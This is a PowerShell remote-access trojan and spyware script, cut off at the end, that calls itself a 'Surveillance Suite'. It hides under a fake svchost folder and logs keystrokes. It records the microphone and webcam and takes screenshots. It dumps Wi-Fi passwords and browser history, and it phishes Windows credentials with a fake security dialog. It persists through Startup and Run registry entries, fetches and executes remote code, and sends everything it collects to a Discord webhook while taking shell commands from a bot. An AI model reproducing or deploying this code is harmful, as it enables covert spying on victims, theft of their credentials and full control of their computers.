# ============================================================
#  Surveillance Suite v3 - Single File
#  Split mode: Webhook = loot, Bot = commands
#  Modules: keylog, voice, camera, IP/geo, browser, wifi-pass, credz
# ============================================================

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# ================= CONFIG =================
$WEBHOOK   = 'https://discord.com/api/webhooks/1554935770056368199/XWMKv-_VKVd0tR1jCLzmxyiteJ7HEAW_J-1FteICNWd3UvDbU0DfbPyjYPQq_aA_dG3S'

# Bot token split into chunks (Method 1 - concat)
$tokA = 'MTU1NDkzNDk3'
$tokB = 'NzQwMDE0MzkwMg'
$tokC = '.GFUbLw.'
$tokD = 'genk5dkeZSwvhq2xPdYK42JClcMo8yOpDLQ8SM'
$BOT_TOKEN = "$tokA$tokB$tokC$tokD"

$OWNER_NAME = 'chaosgd'                    # <-- owner username (matches username OR global_name)
$DROPBOX   = ''                            # <-- optional Dropbox token
$ROOT      = "$env:APPDATA\Microsoft\Windows\svchost"
$CFG       = "$ROOT\cfg.json"
$LOGK      = "$ROOT\k.log"
$CREDFILE  = "$ROOT\creds.txt"
$WIFIFILE  = "$ROOT\wifi.txt"
$VOICEDIR  = "$ROOT\voice"
$CAMDIR    = "$ROOT\cam"
$RECSEC    = 30
$POLLSEC   = 10
$VICTIM    = "$env:USERNAME@$env:COMPUTERNAME"

New-Item -ItemType Directory -Force -Path $ROOT,$VOICEDIR,$CAMDIR | Out-Null

# ================= CONFIG LOAD =================
$cfg = if (Test-Path $CFG) {
    Get-Content $CFG -Raw | ConvertFrom-Json
} else {
    [pscustomobject]@{ thread_id=$null; victim=$VICTIM; kill_at=$null }
}

# ================= WEBHOOK POST (loot) =================
function Invoke-Hook {
    param(
        [string]$Content,
        [string]$ThreadName,
        [string]$ThreadId,
        [string]$FilePath
    )
    $uri = $WEBHOOK
    if ($ThreadId)       { $uri = "$WEBHOOK`?thread_id=$ThreadId" }
    elseif ($ThreadName) { $uri = "$WEBHOOK`?wait=true&thread_name=$([uri]::EscapeDataString($ThreadName))" }

    if ($FilePath -and (Test-Path $FilePath)) {
        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"
        $json = @{ content=$Content; username=$VICTIM } | ConvertTo-Json -Compress
        $head  = "--$boundary$LF"
        $head += "Content-Disposition: form-data; name=`"payload_json`"$LF$LF$json$LF"
        $head += "--$boundary$LF"
        $head += "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $FilePath -Leaf)`"$LF"
        $head += "Content-Type: application/octet-stream$LF$LF"
        $tail  = "$LF--$boundary--$LF"
        $bytes = [Text.Encoding]::UTF8.GetBytes($head) + [IO.File]::ReadAllBytes($FilePath) + [Text.Encoding]::UTF8.GetBytes($tail)
        try { return Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes } catch { return $null }
    }
    $payload = @{ content=$Content; username=$VICTIM } | ConvertTo-Json -Compress
    try { return Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $payload } catch { return $null }
}

# ================= BOT POST (command replies) =================
function Invoke-Bot {
    param(
        [string]$Content,
        [string]$ThreadId,
        [string]$FilePath
    )
    $ch = if ($ThreadId) { $ThreadId } else { $cfg.thread_id }
    if (-not $ch) { return $null }
    $uri = "https://discord.com/api/v10/channels/$ch/messages"
    $headers = @{ Authorization = "Bot $BOT_TOKEN" }

    if ($FilePath -and (Test-Path $FilePath)) {
        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"
        $json = @{ content=$Content } | ConvertTo-Json -Compress
        $head  = "--$boundary$LF"
        $head += "Content-Disposition: form-data; name=`"payload_json`"$LF$LF$json$LF"
        $head += "--$boundary$LF"
        $head += "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $FilePath -Leaf)`"$LF"
        $head += "Content-Type: application/octet-stream$LF$LF"
        $tail  = "$LF--$boundary--$LF"
        $bytes = [Text.Encoding]::UTF8.GetBytes($head) + [IO.File]::ReadAllBytes($FilePath) + [Text.Encoding]::UTF8.GetBytes($tail)
        try { return Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes -Headers $headers } catch { return $null }
    }
    $payload = @{ content=$Content } | ConvertTo-Json -Compress
    try { return Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $payload -Headers $headers } catch { return $null }
}

function DropBox-Upload {
    param([string]$SourceFilePath)
    if ($DROPBOX -eq '') { return }
    $outputFile = Split-Path $SourceFilePath -Leaf
    $arg = '{ "path": "/' + $outputFile + '", "mode": "add", "autorename": true, "mute": false }'
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", "Bearer $DROPBOX")
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    try { Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -InFile $SourceFilePath -Headers $headers } catch {}
}

# ================= THREAD BOOTSTRAP =================
function Ensure-Thread {
    if ($cfg.thread_id) { return $cfg.thread_id }
    $r = Invoke-Hook -Content "🎯 **NEW VICTIM** — ``$VICTIM```nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)" -ThreadName $VICTIM
    if ($r -and $r.channel_id) {
        $cfg.thread_id = $r.channel_id
        $cfg | ConvertTo-Json | Set-Content $CFG -Force
        return $r.channel_id
    }
}
$TID = Ensure-Thread

# ================= GEO =================
function Get-GeoFull {
    $pub = try { (Invoke-RestMethod 'https://api.ipify.org?format=json').ip } catch { return 'IP unavailable' }
    $lines = @("**Public IP:** ``$pub``")
    try { $a = Invoke-RestMethod "http://ip-api.com/json/$pub"; $lines += "**ip-api:** $($a.city), $($a.regionName), $($a.country) ($($a.lat),$($a.lon)) ISP:$($a.isp)" } catch {}
    try { $b = Invoke-RestMethod "https://ipwho.is/$pub"; $lines += "**ipwho:** $($b.city), $($b.region) ($($b.latitude),$($b.longitude)) ISP:$($b.connection.isp)" } catch {}
    try { $c = Invoke-RestMethod "https://ipinfo.io/$pub/json"; $lines += "**ipinfo:** $($c.city), $($c.region) Loc:$($c.loc) Org:$($c.org)" } catch {}
    $bssids = (netsh wlan show networks mode=bssid) -join "`n"
    $macs = [regex]::Matches($bssids,'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}') | % { $_.Value } | Select -Unique
    if ($macs) {
        $lines += "**Nearby BSSIDs:** ``$($macs[0..([Math]::Min(2,$macs.Count-1))] -join ', ')``"
        $lines += "> Cross-ref on wigle.net for tighter fix."
    }
    return ($lines -join "`n")
}

# ================= WIFI PASS =================
function Get-WifiPasswords {
    $out = @()
    $profiles = (netsh wlan show profiles) 2>$null
    foreach ($line in $profiles) {
        if ($line -match ':\s*(.+)$') {
            $name = $matches[1].Trim()
            if ($name -and $name -notmatch '^Profiles|^User') {
                $detail = (netsh wlan show profile name="$name" key=clear) 2>$null
                $pass = ($detail | Select-String 'Key Content\s*:\s*(.+)$' | Select -First 1).Matches.Groups[1].Value
                if (-not $pass) { $pass = '(none/open)' }
                $out += "SSID: $name`nPASS: $pass`n---"
            }
        }
    }
    return ($out -join "`n")
}

function Exfil-Wifi {
    $data = Get-WifiPasswords
    if (-not $data) { Invoke-Bot -Content "No Wi-Fi profiles found." | Out-Null; return }
    $data | Set-Content $WIFIFILE -Force
    DropBox-Upload -SourceFilePath $WIFIFILE
    Invoke-Hook -Content "📶 **Wi-Fi passwords dumped**" -ThreadId $TID -FilePath $WIFIFILE | Out-Null
    Remove-Item $WIFIFILE -Force -EA 0
}

# ================= CAMERA =================
function Snap-Cam {
    param([string]$Tag = 'cam')
    $out = "$CAMDIR\${Tag}_$(Get-Date -f yyyyMMdd_HHmmss).jpg"
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $ff = "$VOICEDIR\ffmpeg.exe"
        if (Test-Path $ff) {
            $devs = & $ff -f dshow -list_devices true -i dummy 2>&1 | Out-String
            $camDev = (Select-String -InputObject $devs -Pattern '"(.+?)"\s+\(video\)' | Select -First 1).Matches.Groups[1].Value
            if ($camDev) {
                & $ff -f dshow -i "video=$camDev" -frames:v 1 -y $out 2>$null
                if (Test-Path $out) { return $out }
            }
        }
        try {
            $wia = New-Object -ComObject WIA.CommonDialog
            $img = $wia.ShowAcquireImage(2)
            if ($img) { $img.SaveFile($out); return $out }
        } catch {}
    } catch {}
    return $null
}

# ================= CRED PROMPT =================
function Invoke-CredPrompt {
    param(
        [string]$Title = 'Windows Security',
        [string]$Message = 'Your session has expired. Please sign in to continue.'
    )
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing

    $overlays = @()
    foreach ($s in [System.Windows.Forms.Screen]::AllScreens) {
        $f = New-Object System.Windows.Forms.Form
        $f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'
        $f.BackColor = 'Black'; $f.Opacity = 0.6
        $f.TopMost = $true; $f.ShowInTaskbar = $false
        $f.StartPosition = 'Manual'
        $f.Location = $s.Bounds.Location; $f.Size = $s.Bounds.Size
        $f.Show()
        $overlays += $f
    }
    [System.Windows.Forms.Application]::DoEvents()

    $form = New-Object System.Windows.Forms.Form
    $form.Text = $Title
    $form.Size = New-Object System.Drawing.Size(420,260)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false; $form.MinimizeBox = $false
    $form.TopMost = $true; $form.BackColor = 'White'

    $icon = New-Object System.Windows.Forms.PictureBox
    $icon.Size = New-Object System.Drawing.Size(48,48)
    $icon.Location = New-Object System.Drawing.Point(20,20)
    $icon.Image = [System.Drawing.SystemIcons]::Shield.ToBitmap()
    $icon.SizeMode = 'StretchImage'
    $form.Controls.Add($icon)

    $lbl = New-Object System.Windows.Forms.Label
    $lbl.Text = $Message; $lbl.Location = New-Object System.Drawing.Point(85,20)
    $lbl.Size = New-Object System.Drawing.Size(310,50)
    $lbl.Font = New-Object System.Drawing.Font('Segoe UI',9)
    $form.Controls.Add($lbl)

    $lblU = New-Object System.Windows.Forms.Label
    $lblU.Text = 'Username'; $lblU.Location = New-Object System.Drawing.Point(20,90)
    $lblU.Size = New-Object System.Drawing.Size(80,20)
    $form.Controls.Add($lblU)

    $txtU = New-Object System.Windows.Forms.TextBox
    $txtU.Location = New-Object System.Drawing.Point(110,88)
    $txtU.Size = New-Object System.Drawing.Size(270,22)
    $txtU.Text = "$env:USERDOMAIN\$env:USERNAME"
    $form.Controls.Add($txtU)

    $lblP = New-Object System.Windows.Forms.Label
    $lblP.Text = 'Password'; $lblP.Location = New-Object System.Drawing.Point(20,125)
    $lblP.Size = New-Object System.Drawing.Size(80,20)
    $form.Controls.Add($lblP)

    $txtP = New-Object System.Windows.Forms.TextBox
    $txtP.Location = New-Object System.Drawing.Point(110,123)
    $txtP.Size = New-Object System.Drawing.Size(270,22)
    $txtP.UseSystemPasswordChar = $true
    $form.Controls.Add($txtP)

    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = 'Sign in'
    $btn.Location = New-Object System.Drawing.Point(290,160)
    $btn.Size = New-Object System.Drawing.Size(90,30)
    $form.Controls.Add($btn)

    $script:captured = $false
    $btn.Add_Click({
        if ($txtP.Text.Length -gt 0) {
            $script:capUser = $txtU.Text
            $script:capPass = $txtP.Text
            $script:captured = $true
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show('Password required.','Sign in','OK','Warning')
        }
    })
    $form.AcceptButton = $btn
    [void]$form.ShowDialog()

    foreach ($o in $overlays) { $o.Close(); $o.Dispose() }

    if ($script:captured) {
        $ts = Get-Date -f 'yyyy-MM-dd HH:mm:ss'
        $entry = "[$ts] $env:COMPUTERNAME | $script:capUser : $script:capPass"
        Add-Content $CREDFILE $entry
        Invoke-Hook -Content "🔑 **CREDS CAPTURED**`n``````$entry``````" -ThreadId $TID | Out-Null
        $tmp = "$ROOT\cred_$(Get-Date -f HHmmss).txt"
        Set-Content $tmp $entry
        DropBox-Upload -SourceFilePath $tmp
    }
}

# ================= CLEAN =================
function Clean-Exfil {
    Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null
    Remove-Item (Get-PSReadlineOption).HistorySavePath -EA 0
    Clear-RecycleBin -Force -EA 0
}

# ================= RECON ON BOOT =================
& {
    $pub  = try { (Invoke-RestMethod 'https://api.ipify.org?format=json').ip } catch { '?' }
    $loc  = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -ne '127.0.0.1' } | % { $_.IPAddress }) -join ', '
    $mac  = (Get-NetAdapter | ? Status -eq 'Up' | % MacAddress) -join ', '
    $wifi = try { (netsh wlan show interfaces) -join "`n" } catch { 'n/a' }
    $ssid = if ($wifi -match 'SSID\s+:\s+(.+)') { $matches[1].Trim() } else { 'unknown' }
    $msg  = "📡 **RECON REPORT**`n``````"
    $msg += "Host    : $env:COMPUTERNAME`n"
    $msg += "User    : $env:USERNAME`n"
    $msg += "PublicIP: $pub`n"
    $msg += "LocalIPs: $loc`n"
    $msg += "MACs    : $mac`n"
    $msg += "Wi-Fi   : $ssid`n``````"
    Invoke-Hook -Content $msg -ThreadId $TID | Out-Null
}

# ================= BACKGROUND MODULES =================
Start-Job -Name keylog -ScriptBlock {
    param($logk)
    Add-Type -AssemblyName System.Windows.Forms
    $sig = @"
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder t, int c);
"@
    $k = Add-Type -MemberDefinition $sig -Name K -Namespace W -PassThru
    $sb = New-Object Text.StringBuilder 256
    $lw = ''
    while ($true) {
        try {
            $h = $k::GetForegroundWindow()
            [void]$k::GetWindowText($h,$sb,256)
            $w = $sb.ToString()
            if ($w -and $w -ne $lw) { "`n[$(Get-Date -f 'HH:mm:ss')] == $w ==`n" | Out-File $logk -Append; $lw = $w }
            foreach ($vk in 8..254) {
                if ($k::GetAsyncKeyState($vk) -band 0x8000) {
                    $c = switch ($vk) {
                        {$_ -ge 65 -and $_ -le 90} {[char]$_}
                        {$_ -ge 48 -and $_ -le 57} {[char]$_}
                        32 {' '} 13 {"`n"} 9 {"`t"} 8 {'[BKSP]'} 27 {'[ESC]'} 46 {'[DEL]'}
                        default {''}
                    }
                    if ($c) { Add-Content $logk -NoNewline $c }
                }
            }
        } catch {}
        Start-Sleep -Milliseconds 25
    }
} -ArgumentList $LOGK | Out-Null

Start-Job -Name voicelog -ScriptBlock {
    param($vdir,$webhook,$tid,$recsec)
    $ff = "$vdir\ffmpeg.exe"
    if (-not (Test-Path $ff)) {
        try {
            $zip = "$vdir\ff.zip"
            Invoke-WebRequest 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile $zip -UseBasicParsing
            Expand-Archive $zip -DestinationPath "$vdir\ff" -Force
            $exe = Get-ChildItem "$vdir\ff" -Recurse -Filter ffmpeg.exe | Select -First 1
            Copy-Item $exe.FullName $ff -Force
            Remove-Item $zip -Force -EA 0
        } catch { return }
    }
    while ($true) {
        $out = "$vdir\rec_$(Get-Date -f yyyyMMdd_HHmmss).wav"
        & $ff -f dshow -list_devices true -i dummy 2>&1 | Out-File "$vdir\devs.txt"
        $dev = (Select-String -Path "$vdir\devs.txt" -Pattern '"(.+?)"\s+\(audio\)' | Select -First 1).Matches.Groups[1].Value
        if (-not $dev) { $dev = 'Microphone' }
        & $ff -f dshow -i "audio=$dev" -t $recsec -ac 1 -ar 16000 -y $out 2>$null
        if (Test-Path $out) {
            $boundary=[guid]::NewGuid().ToString(); $LF="`r`n"
            $json=@{content="🎤 Voice clip ($recsec s)";username="$env:USERNAME@$env:COMPUTERNAME"}|ConvertTo-Json -Compress
            $h ="--$boundary$LF"
            $h+="Content-Disposition: form-data; name=`"payload_json`"$LF$LF$json$LF"
            $h+="--$boundary$LF"
            $h+="Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $out -Leaf)`"$LF"
            $h+="Content-Type: audio/wav$LF$LF"
            $t="$LF--$boundary--$LF"
            $bytes=[Text.Encoding]::UTF8.GetBytes($h)+[IO.File]::ReadAllBytes($out)+[Text.Encoding]::UTF8.GetBytes($t)
            try { Invoke-RestMethod -Uri "$webhook`?thread_id=$tid" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes } catch {}
            Remove-Item $out -Force
        }
    }
} -ArgumentList $VOICEDIR,$WEBHOOK,$TID,$RECSEC | Out-Null

Start-Job -Name camlog -ScriptBlock {
    param($camdir,$vdir,$webhook,$tid)
    Start-Sleep 10
    $ff = "$vdir\ffmpeg.exe"
    while ($true) {
        try {
            if (Test-Path $ff) {
                $devs = & $ff -f dshow -list_devices true -i dummy 2>&1 | Out-String
                $camDev = (Select-String -InputObject $devs -Pattern '"(.+?)"\s+\(video\)' | Select -First 1).Matches.Groups[1].Value
                if ($camDev) {
                    $out = "$camdir\cam_$(Get-Date -f yyyyMMdd_HHmmss).jpg"
                    & $ff -f dshow -i "video=$camDev" -frames:v 1 -y $out 2>$null
                    if (Test-Path $out) {
                        $boundary=[guid]::NewGuid().ToString(); $LF="`r`n"
                        $json=@{content="📷 Camera snap";username="$env:USERNAME@$env:COMPUTERNAME"}|ConvertTo-Json -Compress
                        $h ="--$boundary$LF"
                        $h+="Content-Disposition: form-data; name=`"payload_json`"$LF$LF$json$LF"
                        $h+="--$boundary$LF"
                        $h+="Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $out -Leaf)`"$LF"
                        $h+="Content-Type: image/jpeg$LF$LF"
                        $t="$LF--$boundary--$LF"
                        $bytes=[Text.Encoding]::UTF8.GetBytes($h)+[IO.File]::ReadAllBytes($out)+[Text.Encoding]::UTF8.GetBytes($t)
                        try { Invoke-RestMethod -Uri "$webhook`?thread_id=$tid" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes } catch {}
                        Remove-Item $out -Force -EA 0
                    }
                }
            }
        } catch {}
        Start-Sleep -Seconds 60
    }
} -ArgumentList $CAMDIR,$VOICEDIR,$WEBHOOK,$TID | Out-Null

Start-Job -Name wifiinit -ScriptBlock {
    param($webhook,$tid,$victim)
    Start-Sleep 3
    $out = @()
    $profiles = (netsh wlan show profiles) 2>$null
    foreach ($line in $profiles) {
        if ($line -match ':\s*(.+)$') {
            $name = $matches[1].Trim()
            if ($name -and $name -notmatch '^Profiles|^User') {
                $detail = (netsh wlan show profile name="$name" key=clear) 2>$null
                $pass = ($detail | Select-String 'Key Content\s*:\s*(.+)$' | Select -First 1).Matches.Groups[1].Value
                if (-not $pass) { $pass = '(none/open)' }
                $out += "SSID: $name`nPASS: $pass`n---"
            }
        }
    }
    $data = $out -join "`n"
    if ($data) {
        $tmp = "$env:TEMP\wifi_$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"
        Set-Content $tmp $data
        $boundary=[guid]::NewGuid().ToString(); $LF="`r`n"
        $json=@{content="📶 **Wi-Fi passwords (boot)**";username=$victim}|ConvertTo-Json -Compress
        $h ="--$boundary$LF"
        $h+="Content-Disposition: form-data; name=`"payload_json`"$LF$LF$json$LF"
        $h+="--$boundary$LF"
        $h+="Content-Disposition: form-data; name=`"file`"; filename=`"wifi.txt`"$LF"
        $h+="Content-Type: text/plain$LF$LF"
        $t="$LF--$boundary--$LF"
        $bytes=[Text.Encoding]::UTF8.GetBytes($h)+[IO.File]::ReadAllBytes($tmp)+[Text.Encoding]::UTF8.GetBytes($t)
        try { Invoke-RestMethod -Uri "$webhook`?thread_id=$tid" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes } catch {}
        Remove-Item $tmp -Force -EA 0
    }
} -ArgumentList $WEBHOOK,$TID,$VICTIM | Out-Null

Start-Job -Name credzinit -ScriptBlock {
    param($webhook,$tid,$victim)
    Start-Sleep 8
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $overlays = @()
    foreach ($s in [System.Windows.Forms.Screen]::AllScreens) {
        $f = New-Object System.Windows.Forms.Form
        $f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'
        $f.BackColor = 'Black'; $f.Opacity = 0.6
        $f.TopMost = $true; $f.ShowInTaskbar = $false
        $f.StartPosition = 'Manual'
        $f.Location = $s.Bounds.Location; $f.Size = $s.Bounds.Size
        $f.Show(); $overlays += $f
    }
    [System.Windows.Forms.Application]::DoEvents()

    $form = New-Object System.Windows.Forms.Form
    $form.Text = 'Windows Security'
    $form.Size = New-Object System.Drawing.Size(420,260)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false; $form.MinimizeBox = $false
    $form.TopMost = $true; $form.BackColor = 'White'

    $icon = New-Object System.Windows.Forms.PictureBox
    $icon.Size = New-Object System.Drawing.Size(48,48)
    $icon.Location = New-Object System.Drawing.Point(20,20)
    $icon.Image = [System.Drawing.SystemIcons]::Shield.ToBitmap()
    $icon.SizeMode = 'StretchImage'; $form.Controls.Add($icon)

    $lbl = New-Object System.Windows.Forms.Label
    $lbl.Text = 'Your session has expired. Please sign in to continue.'
    $lbl.Location = New-Object System.Drawing.Point(85,20)
    $lbl.Size = New-Object System.Drawing.Size(310,50)
    $lbl.Font = New-Object System.Drawing.Font('Segoe UI',9)
    $form.Controls.Add($lbl)

    $lblU = New-Object System.Windows.Forms.Label
    $lblU.Text = 'Username'; $lblU.Location = New-Object System.Drawing.Point(20,90)
    $lblU.Size = New-Object System.Drawing.Size(80,20); $form.Controls.Add($lblU)

    $txtU = New-Object System.Windows.Forms.TextBox
    $txtU.Location = New-Object System.Drawing.Point(110,88)
    $txtU.Size = New-Object System.Drawing.Size(270,22)
    $txtU.Text = "$env:USERDOMAIN\$env:USERNAME"
    $form.Controls.Add($txtU)

    $lblP = New-Object System.Windows.Forms.Label
    $lblP.Text = 'Password'; $lblP.Location = New-Object System.Drawing.Point(20,125)
    $lblP.Size = New-Object System.Drawing.Size(80,20); $form.Controls.Add($lblP)

    $txtP = New-Object System.Windows.Forms.TextBox
    $txtP.Location = New-Object System.Drawing.Point(110,123)
    $txtP.Size = New-Object System.Drawing.Size(270,22)
    $txtP.UseSystemPasswordChar = $true; $form.Controls.Add($txtP)

    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = 'Sign in'
    $btn.Location = New-Object System.Drawing.Point(290,160)
    $btn.Size = New-Object System.Drawing.Size(90,30); $form.Controls.Add($btn)

    $script:captured = $false
    $btn.Add_Click({
        if ($txtP.Text.Length -gt 0) {
            $script:capU = $txtU.Text; $script:capP = $txtP.Text
            $script:captured = $true; $form.Close()
        } else { [System.Windows.Forms.MessageBox]::Show('Password required.','Sign in','OK','Warning') }
    })
    $form.AcceptButton = $btn
    [void]$form.ShowDialog()
    foreach ($o in $overlays) { $o.Close(); $o.Dispose() }

    if ($script:captured) {
        $entry = "[$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')] $env:COMPUTERNAME | $script:capU : $script:capP"
        $body = @{ content = "🔑 **CREDS CAPTURED**`n``````$entry``````"; username = $victim } | ConvertTo-Json -Compress
        try { Invoke-RestMethod -Uri "$webhook`?thread_id=$tid" -Method Post -ContentType 'application/json' -Body $body } catch {}
    }
} -ArgumentList $WEBHOOK,$TID,$VICTIM | Out-Null

# ================= PERSISTENCE =================
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPs1  = "$ROOT\svc.ps1"
Copy-Item $PSCommandPath $lnkPs1 -Force -EA 0
if (-not (Test-Path $lnkPs1)) {
    @"
`$u='https://raw.githubusercontent.com/kingirudolph0-commits/gthjkl-.l-kjhgdfvcx-gbthnszrfgbbd/refs/heads/main/deepseek_powershell_20260930_a46556.ps1'
iwr `$u -UseBasicParsing | iex
"@ | Set-Content $lnkPs1
}
$vbs = "$startup\svchost.vbs"
@"
Set s = CreateObject("WScript.Shell")
s.Run "powershell -w h -NoP -NonI -Ep Bypass -File ""$lnkPs1""", 0, False
"@ | Set-Content $vbs
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSvcHost' -Value "powershell -w h -NoP -NonI -Ep Bypass -File `"$lnkPs1`"" -PropertyType String -Force | Out-Null

# ================= COMMAND LISTENER =================
$seenIds = New-Object System.Collections.Generic.HashSet[string]

function Read-Thread {
    try {
        $ch = $cfg.thread_id
        if (-not $ch) { return @() }
        $h = @{ Authorization = "Bot $BOT_TOKEN" }
        $r = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$ch/messages?limit=10" -Headers $h -Method Get
        $out = @()
        foreach ($m in $r) {
            if ($m.author.username -ne $OWNER_NAME -and $m.author.global_name -ne $OWNER_NAME) { continue }
            if ($seenIds.Contains($m.id)) { continue }
            [void]$seenIds.Add($m.id)
            $out += $m
        }
        return $out
    } catch { return @() }
}

while ($true) {
    try {
        if ($cfg.kill_at -and (Get-Date) -ge [datetime]$cfg.kill_at) {
            Invoke-Hook -Content "💀 Killswitch triggered. Self-deleting." -ThreadId $TID | Out-Null
            Remove-Item $ROOT -Recurse -Force -EA 0
            Remove-Item $vbs -Force -EA 0
            Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSvcHost' -EA 0
            exit
        }

        foreach ($m in Read-Thread) {
            $c = $m.content.Trim()

            switch -regex ($c) {

                '^!help$' {
                    $h = @"
**📖 Commands**
``!help`` ``!who`` ``!where`` ``!keylog`` ``!keylogclear``
``!record <sec>`` ``!cam`` ``!screenshot`` ``!browsers`` ``!wifi``
``!wifi-pass`` ``!credz`` ``!creds`` ``!clean``
``!shell <cmd>`` ``!download <path>`` ``!upload <url> <path>``
``!shutdown`` ``!reboot`` ``!lock`` ``!kill <date>`` ``!selfdestruct``
"@
                    Invoke-Bot -Content $h | Out-Null
                }

                '^!who$' {
                    $i = "**Host:** ``$env:COMPUTERNAME```n**User:** ``$env:USERNAME```n**Domain:** ``$env:USERDOMAIN```n**OS:** $((Get-CimInstance Win32_OperatingSystem).Caption)"
                    Invoke-Bot -Content $i | Out-Null
                }

                '^!where$' { Invoke-Bot -Content (Get-GeoFull) | Out-Null }

                '^!keylog$' {
                    if (Test-Path $LOGK) { Invoke-Hook -Content "📝 Keylog" -ThreadId $TID -FilePath $LOGK | Out-Null }
                    else { Invoke-Bot -Content "Keylog empty." | Out-Null }
                }

                '^!keylogclear$' {
                    Remove-Item $LOGK -Force -EA 0
                    Invoke-Bot -Content "🧹 Keylog wiped." | Out-Null
                }

                '^!record\s+(\d+)$' {
                    $sec = [int]$matches[1]
                    $out = "$VOICEDIR\cmd_$(Get-Date -f HHmmss).wav"
                    & "$VOICEDIR\ffmpeg.exe" -f dshow -i "audio=Microphone" -t $sec -ac 1 -ar 16000 -y $out 2>$null
                    if (Test-Path $out) { Invoke-Hook -Content "🎤 Manual rec ($sec s)" -ThreadId $TID -FilePath $out | Out-Null; Remove-Item $out -Force }
                }

                '^!cam$' {
                    Invoke-Bot -Content "📷 Snapping cam..." | Out-Null
                    $p = Snap-Cam -Tag 'cmd'
                    if ($p -and (Test-Path $p)) {
                        Invoke-Hook -Content "📷 Camera snap" -ThreadId $TID -FilePath $p | Out-Null
                        Remove-Item $p -Force
                    } else {
                        Invoke-Bot -Content "❌ Camera unavailable." | Out-Null
                    }
                }

                '^!screenshot$' {
                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                    $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
                    $bmp = New-Object System.Drawing.Bitmap $b.Width,$b.Height
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size)
                    $p = "$ROOT\ss_$(Get-Date -f HHmmss).png"
                    $bmp.Save($p)
                    Invoke-Hook -Content "📸 Screenshot" -ThreadId $TID -FilePath $p | Out-Null
                    Remove-Item $p -Force
                }

                '^!browsers$' {
                    $out = "$ROOT\bd.txt"
                    Remove-Item $out -Force -EA 0
                    $re = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
                    $b = @{
                        chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
                        brave  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
                        edge   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
                        opera  = "$env:APPDATA\Opera Software\Opera GX Stable"
                    }
                    foreach ($n in $b.Keys) {
                        foreach ($t in 'History','Bookmarks') {
                            $p = Join-Path $b[$n] $t
                            if (Test-Path $p) {
                                $tmp = "$env:TEMP\bd_$n$t"
                                Copy-Item $p $tmp -Force -EA 0
                                Get-Content $tmp -Raw -EA 0 | Select-String -AllMatches $re | % { ($_.Matches).Value } | Sort -Unique | % { "[$n/$t] $_" } >> $out
                                Remove-Item $tmp -Force -EA 0
                            }
                        }
                    }
                    if (Test-Path $out) { Invoke-Hook -Content "🌐 Browser data" -ThreadId $TID -FilePath $out | Out-Null; Remove-Item $out -Force }
                    else { Invoke-Bot -Content "No browser data found." | Out-Null }
                }

                '^!wifi$' {
                    $w = (netsh wlan show interfaces) -join "`n"
                    $n = (netsh wlan show networks mode=bssid) -join "`n"
                    $msg = "**Connected:**`n``````$w```````n**Nearby:**`n``````$($n.Substring(0,[Math]::Min(1800,$n.Length)))``````"
                    Invoke-Bot -Content $msg | Out-Null
                }

                '^!wifi-pass$' { Exfil-Wifi }

                '^!credz$' {
                    Invoke-Bot -Content "🎣 Spawning cred prompt..." | Out-Null
                    Start-Job -ScriptBlock {
